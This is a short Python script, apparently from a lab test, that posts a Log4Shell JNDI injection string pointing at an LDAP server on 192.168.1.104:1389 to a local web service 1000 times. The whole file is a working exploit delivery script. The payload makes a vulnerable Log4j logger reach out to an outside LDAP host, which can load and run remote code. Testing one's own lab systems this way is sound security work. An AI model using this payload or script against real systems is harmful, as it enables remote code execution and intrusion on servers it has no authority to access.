#!/usr/bin/python

import requests

def make_post_call():
  for i in range(1000):
    #pload = 'hello'
    #openssl s_client -connect 192.168.1.104:1389
    pload = '${jndi:ldap://192.168.1.104:1389/Test}'
    #pload = '${jndi:ldap://localhost:1389/Test}'
    r = requests.post('http://localhost:8080/post',data = pload)
    print("Sent request")


if __name__ == '__main__':
  make_post_call()
